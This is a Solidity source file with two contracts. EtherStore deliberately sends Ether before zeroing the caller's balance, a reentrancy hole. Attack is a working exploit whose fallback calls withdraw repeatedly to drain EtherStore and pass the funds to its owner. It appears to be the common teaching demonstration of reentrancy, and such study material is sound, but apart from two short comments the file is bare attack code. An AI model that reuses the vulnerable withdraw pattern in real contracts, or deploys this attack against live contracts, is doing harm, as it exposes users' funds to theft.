// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;


contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }


    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;
    uint256 public constant AMOUNT = 1 ether;
    address public owner;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        owner = msg.sender;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= AMOUNT) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
   function withdraw() public {
        require(msg.sender == owner, "Not the attacker");
        payable(owner).transfer(address(this).balance);
    }
    function getOwner() public view returns (address) {
    return owner;
    }
    function getSender() public view returns (address) {
    return msg.sender;
    }
}
